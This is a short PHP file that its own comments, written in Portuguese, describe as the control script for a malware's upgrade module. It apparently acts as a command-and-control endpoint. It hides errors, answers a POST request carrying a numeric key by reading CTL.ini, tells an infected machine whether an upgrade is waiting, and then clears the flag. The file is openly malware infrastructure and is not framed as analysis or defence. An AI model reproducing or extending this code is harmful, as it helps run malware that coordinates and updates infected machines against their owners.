<?php
//
// 3409854572348454.php ~~ MalwareUpgrade.php
//  Arquivo de controle do módulo de upgrade do Malware.
//

	error_reporting(0);
	if (isset($_POST["829492"])) {
		
		$CTLINI = parse_ini_file("CTL.ini", "CTL");
		$CTLIDX = $CTLINI["CTL"]["ID"];
		
		// Verifica se o comando é para está máquina...
		if (strcmp($CTLIDX, "1") == 0) {
			// Tem upgrades...
			echo "1";
			
			$buf = "[CTL]\nID=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		} else {
			// Não tem upgrades...
			echo "0";
	
			$buf = "[CTL]\nID=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		}
	}

// EOF
?>
